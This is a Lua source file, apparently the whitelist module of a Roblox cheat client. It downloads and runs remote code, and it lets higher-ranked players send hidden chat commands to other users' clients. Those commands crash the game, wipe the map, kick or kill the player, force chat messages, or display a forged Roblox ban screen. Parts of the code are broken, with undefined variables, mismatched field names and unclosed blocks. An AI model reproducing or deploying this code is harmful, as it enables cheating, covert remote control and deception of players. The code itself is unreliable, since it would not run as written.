local whitelist = {}
local isfile = isfile or function(file)
	local suc, res = pcall(function()
		return readfile(file)
	end)
	return suc and res ~= nil and res ~= ''
end
local function downloadFile(path, func)
	if not isfile(path) then
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/zuyv/ZenV4/'..readfile('newvape/profiles/commit.txt')..'/'..select(1, path:gsub('newvape/', '')), true)
		end)
		if not suc or res == '404: Not Found' then
			error(res)
		end
		if path:find('.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n'..res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end
local run = function(func)
	func()
end
local cloneref = cloneref or function(o) return o end
local playersService = cloneref(game:GetService('Players'))
local replicatedStorage = cloneref(game:GetService('ReplicatedStorage'))
local runService = cloneref(game:GetService('RunService'))
local inputService = cloneref(game:GetService('UserInputService'))
local tweenService = cloneref(game:GetService('TweenService'))
local lightingService = cloneref(game:GetService('Lighting'))
local marketplaceService = cloneref(game:GetService('MarketplaceService'))
local teleportService = cloneref(game:GetService('TeleportService'))
local httpService = cloneref(game:GetService('HttpService'))
local guiService = cloneref(game:GetService('GuiService'))
local groupService = cloneref(game:GetService('GroupService'))
local textChatService = cloneref(game:GetService('TextChatService'))
local contextService = cloneref(game:GetService('ContextActionService'))
local coreGui = cloneref(game:GetService('CoreGui'))
local lplr = playersService.LocalPlayer
local vape = shared.vape
whitelist.hashes = {}
whitelist.data = { WhitelistedUsers = {}, BlacklistedUsers = {} }
whitelist.customTags = {}
whitelist.detected = {}
whitelist.localPriority = 0
whitelist.loaded = false
whitelist.commands = {}
whitelist.said = {}
local hash = loadstring(downloadFile("newvape/libraries/hash.lua"), "hash")()
local entitylib = loadstring(downloadFile('newvape/libraries/entity.lua'), 'entitylibrary')()
entitylib.start()
task.spawn(function()
	whitelist.commands = {
		byfron = function()
			task.spawn(function()
				if vape.ThreadFix then
					setthreadidentity(8)
				end
				local UIBlox = getrenv().require(game:GetService('CorePackages').UIBlox)
				local Roact = getrenv().require(game:GetService('CorePackages').Roact)
				UIBlox.init(getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppUIBloxConfig))
				local auth = getrenv().require(coreGui.RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
				local darktheme = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Style).Themes.DarkTheme
				local fonttokens = getrenv().require(game:GetService("CorePackages").Packages._Index.UIBlox.UIBlox.App.Style.Tokens).getTokens('Desktop', 'Dark', true)
				local buildersans = getrenv().require(game:GetService('CorePackages').Packages._Index.UIBlox.UIBlox.App.Style.Fonts.FontLoader).new(true, fonttokens):loadFont()
				local tLocalization = getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppLocales).Localization
				local localProvider = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Localization).LocalizationProvider
				lplr.PlayerGui:ClearAllChildren()
				vape.gui.Enabled = false
				coreGui:ClearAllChildren()
				lightingService:ClearAllChildren()
				for _, v in workspace:GetChildren() do
					pcall(function()
						v:Destroy()
					end)
				end
				lplr.kick(lplr)
				guiService:ClearError()
				local gui = Instance.new('ScreenGui')
				gui.IgnoreGuiInset = true
				gui.Parent = coreGui
				local frame = Instance.new('ImageLabel')
				frame.BorderSizePixel = 0
				frame.Size = UDim2.fromScale(1, 1)
				frame.BackgroundColor3 = Color3.fromRGB(224, 223, 225)
				frame.ScaleType = Enum.ScaleType.Crop
				frame.Parent = gui
				task.delay(0.3, function()
					frame.Image = 'rbxasset://textures/ui/LuaApp/graphic/Auth/GridBackground.jpg'
				end)
				task.delay(0.6, function()
					local modPrompt = Roact.createElement(auth, {
						style = {},
						screenSize = vape.gui.AbsoluteSize or Vector2.new(1920, 1080),
						moderationDetails = {
							punishmentTypeDescription = 'Delete',
							beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
							reactivateAccountActivated = true,
							badUtterances = {{abuseType = 'ABUSE_TYPE_CHEAT_AND_EXPLOITS', utteranceText = 'ExploitDetected - Place ID : '..game.PlaceId}},
							messageToUser = 'Roblox does not permit the use of third-party software to modify the client.'
						},
						termsActivated = function() end,
						communityGuidelinesActivated = function() end,
						supportFormActivated = function() end,
						reactivateAccountActivated = function() end,
						logoutCallback = function() end,
						globalGuiInset = {top = 0}
					})

					local screengui = Roact.createElement(localProvider, {
						localization = tLocalization.new('en-us')
					}, {Roact.createElement(UIBlox.Style.Provider, {
						style = {
							Theme = darktheme,
							Font = buildersans
						},
					}, {modPrompt})})

					Roact.mount(screengui, coreGui)
				end)
			end)
		end,
		crash = function()
			task.spawn(function()
				repeat
					local part = Instance.new('Part')
					part.Size = Vector3.new(1e10, 1e10, 1e10)
					part.Parent = workspace
				until false
			end)
		end,
		deletemap = function()
			local terrain = workspace:FindFirstChildWhichIsA('Terrain')
			if terrain then
				terrain:Clear()
			end

			for _, v in workspace:GetChildren() do
				if v ~= terrain and not v:IsDescendantOf(lplr.Character) and not v:IsA('Camera') then
					v:Destroy()
					v:ClearAllChildren()
				end
			end
		end,
		framerate = function(args)
			if #args < 1 or not setfpscap then return end
			setfpscap(tonumber(args[1]) ~= '' and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
		end,
		gravity = function(args)
			workspace.Gravity = tonumber(args[1]) or workspace.Gravity
		end,
		jump = function()
			if entitylib.isAlive and entitylib.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
			end
		end,
		kick = function(args)
			task.spawn(function()
				lplr:Kick(table.concat(args, ' '))
			end)
		end,
		kill = function()
			if entitylib.isAlive then
				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
				entitylib.character.Humanoid.Health = 0
			end
		end,
		reveal = function()
			task.delay(0.1, function()
				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
					textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I am using the inhaler client')
				else
					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I am using the inhaler client', 'All')
				end
			end)
		end,
		shutdown = function()
			game:Shutdown()
		end,
		toggle = function(args)
			if #args < 1 then return end
			if args[1]:lower() == 'all' then
				for i, v in vape.Modules do
					if i ~= 'Panic' and i ~= 'ServerHop' and i ~= 'Rejoin' then
						v:Toggle()
					end
				end
			else
				for i, v in vape.Modules do
					if i:lower() == args[1]:lower() then
						v:Toggle()
						break
					end
				end
			end
		end,
		trip = function()
			if entitylib.isAlive then
				if entitylib.character.RootPart.Velocity.Magnitude < 15 then
					entitylib.character.RootPart.Velocity = entitylib.character.RootPart.CFrame.LookVector * 15
				end
				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
			end
		end,
		uninject = function()
			if olduninject then
				if vape.ThreadFix then
					setthreadidentity(8)
				end
				olduninject(vape)
			else
				vape:Uninject()
			end
		end,
		void = function()
			if entitylib.isAlive then
				entitylib.character.RootPart.CFrame += Vector3.new(0, -1000, 0)
			end
		end
	}
end)
function whitelist:hashPlayer(plr)
	return self.hashes[plr] or hash.sha512(plr.Name .. plr.UserId .. "SelfReport")
end

function whitelist:get(plr)
	local playerHash = self:hashPlayer(plr)
	for _, entry in ipairs(self.data.WhitelistedUsers) do
		if entry.hash == playerHash then
			return entry.level or 0, (entry.attackable ~= false), entry.tags
		end
	end
	return 0, true, nil
end

function whitelist:isInGame()
	for _, plr in ipairs(playersService:GetPlayers()) do
		if self:get(plr) ~= 0 then
			return true
		end
	end
	return false
end

function whitelist:getTag(plr, rich)
	local _, _, tags = self:get(plr)
	tags = tags or self.customTags[plr.Name]
	if not tags then return "" end

	local out = ""
	for _, t in ipairs(tags) do
		if rich then
			out ..= `<font color="#{t.color:ToHex()}">[{t.text}]</font> `
		else
			out ..= "[" .. t.text .. "] "
		end
	end

	return out
end

function whitelist:getplayer(arg)
	if arg == 'default' and self.localprio == 0 then return true end
	if arg == 'private' and self.localprio == 1 then return true end
	if arg and lplr.Name:lower():sub(1, arg:len()) == arg:lower() then return true end
	return false
end

function whitelist:notify(plr)
	if self.detected[plr.UserId] then return end
	self.detected[plr.UserId] = true

	vape:CreateNotification("Onyx",plr.Name .. " is using Onyx!",10,"alert")

	self.customTags[plr.Name] = {{
		text = "ONYX USER",
		color = Color3.fromRGB(255, 220, 0)
	}}
	local newent = entitylib.getEntity(plr)
	if newent then
		entitylib.Events.EntityUpdated:Fire(newent)
	end
end

function whitelist:process(msg, plr)
	if plr == lplr and msg == 'helloimusinginhaler' then return true end
		if self.localprio > 0 and not self.said[plr.Name] and msg == 'helloimusinginhaler' and plr ~= lplr then
		self.said[plr.Name] = true
		self:notify(plr)
		return true
	end
	if self.localprio < self:get(plr) or plr == lplr then
		local args = msg:split(' ')
		table.remove(args, 1)
		if self:getplayer(args[1]) then
			table.remove(args, 1)
			for cmd, func in self.commands do
				if msg:sub(1, cmd:len() + 1):lower() == ';'..cmd:lower() then
					func(args, plr)
				return true
			end
		end
	end
end

function whitelist:onPlayerAdded(plr)
	local level = self:get(plr)
	if level > 0 and self.localPriority == 0 then
		task.delay(10, function()
			if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("helloimusinginhaler")
			end
		end)
	end
end

function whitelist:update()
	local success, raw = pcall(function()
		local page = game:HttpGet("https://github.com/zuyv/WhitelistJSON")
		local commit = page:match("currentOid.-(%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x)") or "main"
		return game:HttpGet("https://raw.githubusercontent.com/zuyv/WhitelistJSON/"..commit.. "/PlayerWhitelist.json",true)
	end)
	if not success then return end
	local decoded = http:JSONDecode(raw)
	if type(decoded) ~= "table" then return end
	self.data = decoded
	self.localPriority = self:get(lplr)
	self.loaded = true
end

task.spawn(function()
	task.wait(1.55)
	self:update()

	if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
		textChatService.OnIncomingMessage = function(msg)
			local src = msg.TextSource
			if not src then
				return Enum.TextChatMessageStatus.Success
			end

			local plr = playersService:GetPlayerByUserId(src.UserId)
			if plr and whitelist:process(msg.Text, plr) then
				return Enum.TextChatMessageStatus.Suppressed
			end

			return Enum.TextChatMessageStatus.Success
		end
	else
		replicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
			local plr = playersService:GetPlayerByUserId(data.FromSpeaker)
			if plr then
				whitelist:process(data.Message, plr)
			end
		end)
	end

	for _, plr in ipairs(playersService:GetPlayers()) do
		self:onPlayerAdded(plr)
	end
	playersService.PlayerAdded:Connect(function(plr)
		self:onPlayerAdded(plr)
	end)

	vape:Clean(function()
		table.clear(whitelist.commands)
		table.clear(whitelist.data)
		table.clear(whitelist)
	end)	
end)

return whitelist
